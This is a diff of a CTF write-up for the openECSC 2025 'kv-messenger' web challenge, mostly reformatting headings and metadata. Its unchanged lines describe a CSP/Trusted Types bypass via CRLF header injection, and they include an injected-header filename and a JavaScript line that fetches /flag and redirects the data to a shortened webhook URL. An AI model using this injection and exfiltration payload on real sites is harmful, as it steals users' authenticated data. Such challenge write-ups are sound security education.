@@ -1,24 +1,19 @@
 ---
 title: "KV-Messenger - openECSC 2025 Web Challenge Writeup"
 description: "openECSC 2025 KV-Messenger writeup. Bypass strict CSP with Trusted Types using CRLF injection to serve stored messages as JavaScript and exfiltrate flag."
+ctf: "openECSC 2025"
+date: 2025-10-05
+category: web
+difficulty: medium
+flag_format: "openECSC{...}"
+author: "zeba"
 ---
 
-# openECSC 2025
+# kv-messenger
 
-## Challenge: kv-messenger
+**openECSC 2025** · Web · Medium
 
-## Tags: web
-
-## Difficulty: Medium
-
-## Table of Contents
-
-- [Solution Overview](#solution-overview)
-- [Solution](#solution)
-- [Solution Script](#solution-script)
-- [Flag](#flag)
-
-### Solution Overview
+## Solution Overview
 
 This challenge requires bypassing a strict CSP policy that enforces Trusted Types and only allows same-origin scripts. The solution exploits:
 
@@ -29,9 +24,9 @@ This challenge requires bypassing a strict CSP policy that enforces Trusted Type
 
 The attack chain: Store JS payload → CRLF inject Content-Type header → Load as same-origin script in victim page → Exfiltrate flag.
 
-### Solution
+## Solution
 
-#### Initial Recon
+### Initial Recon
 
 The challenge presents a simple key-value message storage application. Users can store messages and download them as HTML files. There's also a `/flag` endpoint that requires a secret cookie (which the bot has).
 
@@ -54,7 +49,7 @@ Translation: "No inline scripts, no `eval()`, no external scripts, and you MUST 
 
 Cool cool cool... 😅
 
-#### The CSP Wall
+### The CSP Wall
 
 The application wraps user messages in HTML:
 
@@ -67,7 +62,7 @@ I can inject HTML like `</pre></code><img src=x onerror=alert(1)>`, but CSP bloc
 
 **Dead end #1**: Direct HTML injection with inline scripts ❌
 
-#### Finding the CRLF Injection
+### Finding the CRLF Injection
 
 The `/download` endpoint has an interesting vulnerability in line 154:
 
@@ -88,7 +83,7 @@ filename = 'test"\r\nX-Custom: injected'
 
 But wait... CSP still blocks scripts from non-`'self'` origins. How does this help?
 
-#### The "Aha!" Moment
+### The "Aha!" Moment
 
 Here's the trick: **same-origin script loading**! 
 
@@ -141,7 +136,7 @@ fetch("/flag").then(r=>r.json()).then(d=>location="//tinyurl.com/2te9sk4y?f="+d.
 
 The shortened URL (`tinyurl.com/2te9sk4y` → `webhook.site/8b78691f-...`) saved 37 characters, giving me the breathing room I needed!
 
-#### Solution Script
+## Solution Script
 
 The exploit works as follows:
 
@@ -179,4 +174,3 @@ Full exploit: [exploit.py](exploit.py)
 ---
 
 [← Back to openECSC 2025](../../README.md)
-
